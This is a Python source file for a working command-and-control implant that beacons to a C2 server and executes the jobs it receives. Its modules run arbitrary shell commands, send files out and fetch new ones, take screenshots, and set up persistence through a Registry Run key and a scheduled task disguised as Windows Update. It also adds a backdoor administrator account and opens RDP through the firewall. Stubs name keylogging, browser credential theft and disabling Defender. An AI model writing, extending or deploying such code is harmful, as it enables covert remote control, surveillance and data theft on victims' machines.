#!/usr/bin/env python3
import requests
import json
import time
import base64
import os
import getpass
import platform
import subprocess
import sys
from base_agent import BaseAgent

class HTTPAgent(BaseAgent):
    def __init__(self, server_url, agent_id=None, sleep_interval=60):
        super().__init__()
        # Ensure server_url has http:// and correct port
        if not server_url.startswith('http'):
            server_url = f"http://{server_url}"
        self.server_url = server_url
        self.agent_id = agent_id or self.generate_agent_id()
        self.sleep_interval = sleep_interval
        self.session = requests.Session()
        
        # Simple XOR encryption key
        self.encryption_key = b'simplekey12345678'
    
    def generate_agent_id(self):
        """Generate unique agent ID"""
        import hashlib
        hostname = platform.node()
        username = getpass.getuser()
        unique_string = f"{hostname}_{username}_{os.urandom(8).hex()}"
        return hashlib.md5(unique_string.encode()).hexdigest()[:16]
    
    def encrypt_data(self, data):
        """Simple XOR encryption"""
        if isinstance(data, str):
            data = data.encode()
        
        encrypted = bytearray()
        key_len = len(self.encryption_key)
        for i, byte in enumerate(data):
            encrypted.append(byte ^ self.encryption_key[i % key_len])
        
        return base64.b64encode(encrypted).decode()
    
    def decrypt_data(self, encrypted_data):
        """Decrypt XOR encrypted data"""
        encrypted_bytes = base64.b64decode(encrypted_data)
        decrypted = bytearray()
        key_len = len(self.encryption_key)
        
        for i, byte in enumerate(encrypted_bytes):
            decrypted.append(byte ^ self.encryption_key[i % key_len])
        
        return decrypted.decode()
    
    def beacon(self):
        """Send beacon to C2 server"""
        system_info = self.get_system_info()
        
        beacon_data = {
            'agent_id': self.agent_id,
            'system_info': system_info,
            'timestamp': time.time()
        }
        
        try:
            response = self.session.post(
                f"{self.server_url}/beacon",  # Note: /beacon endpoint
                json=beacon_data,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get('jobs', [])
            else:
                print(f"[-] Beacon failed: {response.status_code}")
                return []
                
        except Exception as e:
            print(f"[-] Beacon error: {e}")
            return []
    
    def send_result(self, job_id, output, success=True):
        """Send job result to C2 server"""
        result_data = {
            'agent_id': self.agent_id,
            'job_id': job_id,
            'output': output,
            'success': success,
            'timestamp': time.time()
        }
        
        try:
            response = self.session.post(
                f"{self.server_url}/result",
                json=result_data,
                timeout=30
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[-] Error sending result: {e}")
            return False
    
    def upload_file(self, local_path, remote_filename=None):
        """Upload file to C2 server"""
        if not os.path.exists(local_path):
            return False
        
        remote_filename = remote_filename or os.path.basename(local_path)
        
        try:
            with open(local_path, 'rb') as f:
                files = {'file': (remote_filename, f)}
                data = {'agent_id': self.agent_id, 'filename': remote_filename}
                
                response = self.session.post(
                    f"{self.server_url}/upload",
                    files=files,
                    data=data,
                    timeout=60
                )
                
                return response.status_code == 200
        except Exception as e:
            print(f"[-] Upload error: {e}")
            return False
    
    def download_file(self, remote_filename, local_path):
        """Download file from C2 server"""
        try:
            response = self.session.get(
                f"{self.server_url}/download/{remote_filename}",
                timeout=60
            )
            
            if response.status_code == 200:
                with open(local_path, 'wb') as f:
                    f.write(response.content)
                return True
            else:
                return False
                
        except Exception as e:
            print(f"[-] Download error: {e}")
            return False
    
    def run(self):
        """Main agent loop with HTTP communication"""
        print(f"[+] HTTP Agent started. ID: {self.agent_id}")
        print(f"[+] C2 Server: {self.server_url}")
        
        while True:
            try:
                # Beacon to server
                jobs = self.beacon()
                
                # Execute received jobs
                for job in jobs:
                    job_id = job.get('job_id')
                    module_name = job.get('module_name')
                    arguments = job.get('arguments', {})
                    
                    print(f"[+] Executing job {job_id}: {module_name}")
                    result = self.execute_module(module_name, arguments)
                    
                    # Send result back
                    self.send_result(job_id, result)
                
                # Sleep before next beacon
                time.sleep(self.sleep_interval)
                
            except KeyboardInterrupt:
                print("\n[!] Agent stopped by user")
                break
            except Exception as e:
                print(f"[-] Agent error: {e}")
                time.sleep(self.sleep_interval)
    
    def execute_module(self, module_name, arguments):
        """Enhanced module execution with advanced capabilities"""
        try:
            if module_name == 'shell':
                return self.execute_shell_command(arguments)
            elif module_name == 'sysinfo':
                return self.get_detailed_system_info()
            elif module_name == 'persistence':
                return self.establish_persistence(arguments)
            elif module_name == 'useradd':
                return self.create_user(arguments)
            elif module_name == 'rdp':
                return self.manage_rdp(arguments)
            elif module_name == 'download':
                return self.handle_download(arguments)
            elif module_name == 'upload':
                return self.handle_upload(arguments)
            elif module_name == 'screenshot':
                return self.take_screenshot()
            elif module_name == 'keylogger':
                return self.manage_keylogger(arguments)
            elif module_name == 'process_list':
                return self.get_process_list()
            elif module_name == 'loot_browser':
                return self.loot_browser_credentials()
            elif module_name == 'disable_defender':
                return self.disable_defender()
            elif module_name == 'enable_rdp':
                return self.enable_rdp()
            else:
                return f"Unknown module: {module_name}"
        except Exception as e:
            return f"Module execution error: {str(e)}"
    
    # ===== ADVANCED MODULE IMPLEMENTATIONS =====
    
    def get_detailed_system_info(self):
        """Get comprehensive system information"""
        import psutil
        
        info = {
            'hostname': platform.node(),
            'os': platform.platform(),
            'architecture': platform.architecture()[0],
            'processor': platform.processor(),
            'current_user': getpass.getuser(),
            'python_version': platform.python_version(),
            'current_directory': os.getcwd(),
            'ram_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),
            'ram_available_gb': round(psutil.virtual_memory().available / (1024**3), 2),
            'boot_time': psutil.boot_time(),
            'cpu_cores': psutil.cpu_count(),
            'disk_usage': {}
        }
        
        # Get disk information
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                info['disk_usage'][partition.mountpoint] = {
                    'total_gb': round(usage.total / (1024**3), 2),
                    'used_gb': round(usage.used / (1024**3), 2),
                    'free_gb': round(usage.free / (1024**3), 2)
                }
            except:
                pass
        
        return json.dumps(info, indent=2)
    
    def establish_persistence(self, arguments):
        """Establish persistence on the system"""
        method = arguments.get('method', 'registry')
        
        if platform.system() != 'Windows':
            return "Persistence currently only supported on Windows"
        
        try:
            if method == 'registry':
                return self.registry_persistence()
            elif method == 'scheduled_task':
                return self.scheduled_task_persistence()
            else:
                return f"Unknown persistence method: {method}"
        except Exception as e:
            return f"Persistence failed: {str(e)}"
    
    def registry_persistence(self):
        """Windows Registry Run key persistence"""
        try:
            import winreg
            
            # Get current script path
            current_path = os.path.abspath(sys.argv[0])
            
            # Add to HKCU Run key
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, current_path)
            
            return "Registry persistence established in HKCU Run key"
        except Exception as e:
            return f"Registry persistence failed: {str(e)}"
    
    def scheduled_task_persistence(self):
        """Windows Scheduled Task persistence"""
        try:
            current_path = os.path.abspath(sys.argv[0])
            task_name = "WindowsUpdateMaintenance"
            
            # Create scheduled task that runs every hour
            cmd = f'schtasks /create /tn "{task_name}" /tr "{current_path}" /sc hourly /mo 1 /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                return f"Scheduled task '{task_name}' created successfully"
            else:
                return f"Scheduled task creation failed: {result.stderr}"
        except Exception as e:
            return f"Scheduled task persistence failed: {str(e)}"
    
    def create_user(self, arguments):
        """Create a new user account"""
        username = arguments.get('username', 'testuser')
        password = arguments.get('password', 'Password123!')
        
        if platform.system() != 'Windows':
            return "User creation currently only supported on Windows"
        
        try:
            # Create user
            cmd = f'net user {username} {password} /add /y'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Add to administrators group
                cmd2 = f'net localgroup administrators {username} /add'
                subprocess.run(cmd2, shell=True, capture_output=True)
                return f"User '{username}' created and added to administrators group"
            else:
                return f"User creation failed: {result.stderr}"
        except Exception as e:
            return f"User creation error: {str(e)}"
    
    def manage_rdp(self, arguments):
        """Enable or disable RDP"""
        action = arguments.get('action', 'enable')
        
        if platform.system() != 'Windows':
            return "RDP management only supported on Windows"
        
        try:
            if action == 'enable':
                # Enable RDP
                cmd1 = 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
                subprocess.run(cmd1, shell=True, capture_output=True)
                
                # Open firewall
                cmd2 = 'netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389'
                subprocess.run(cmd2, shell=True, capture_output=True)
                
                return "RDP enabled and firewall configured"
            else:
                return "RDP disable not implemented"
        except Exception as e:
            return f"RDP management failed: {str(e)}"
    
    def take_screenshot(self):
        """Take a screenshot"""
        try:
            # For Windows
            if platform.system() == 'Windows':
                import pyautogui
                screenshot = pyautogui.screenshot()
                
                # Convert to base64 for transmission
                import io
                buffer = io.BytesIO()
                screenshot.save(buffer, format='PNG')
                screenshot_data = base64.b64encode(buffer.getvalue()).decode()
                
                return f"SCREENSHOT:{screenshot_data}"
            else:
                return "Screenshot currently only supported on Windows"
        except ImportError:
            return "pyautogui not installed for screenshots"
        except Exception as e:
            return f"Screenshot failed: {str(e)}"
    
    def get_process_list(self):
        """Get running processes"""
        try:
            import psutil
            
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
                try:
                    processes.append(proc.info)
                except psutil.NoSuchProcess:
                    continue
            
            # Format output
            result = "Running Processes (Top 20 by Memory):\n"
            result += "-" * 80 + "\n"
            result += f"{'PID':<8} {'Name':<20} {'User':<15} {'Memory %':<10} {'CPU %':<8}\n"
            result += "-" * 80 + "\n"
            
            processes.sort(key=lambda x: x['memory_percent'] or 0, reverse=True)
            for proc in processes[:20]:
                result += f"{proc['pid']:<8} {proc['name'][:19]:<20} {proc['username'][:14]:<15} {proc['memory_percent'] or 0:<10.2f} {proc['cpu_percent'] or 0:<8.2f}\n"
            
            return result
        except Exception as e:
            return f"Process list error: {str(e)}"
    
    def handle_download(self, arguments):
        """Handle file download from C2"""
        remote_file = arguments.get('remote_file')
        local_path = arguments.get('local_path', remote_file)
        
        if self.download_file(remote_file, local_path):
            return f"Downloaded {remote_file} to {local_path}"
        else:
            return f"Failed to download {remote_file}"
    
    def handle_upload(self, arguments):
        """Handle file upload to C2"""
        local_file = arguments.get('local_file')
        remote_name = arguments.get('remote_name', os.path.basename(local_file))
        
        if self.upload_file(local_file, remote_name):
            return f"Uploaded {local_file} as {remote_name}"
        else:
            return f"Failed to upload {local_file}"
    
    # Placeholder methods for future implementation
    def manage_keylogger(self, arguments):
        return "Keylogger module not yet implemented"
    
    def loot_browser_credentials(self):
        return "Browser credential looting not yet implemented"
    
    def disable_defender(self):
        return "Defender disable not yet implemented"
    
    def enable_rdp(self):
        return self.manage_rdp({'action': 'enable'})

if __name__ == "__main__":
    # Use the correct URL format with http:// and port
    agent = HTTPAgent(server_url="http://127.0.0.1:8443")  # Match your HTTP listener port
    agent.run()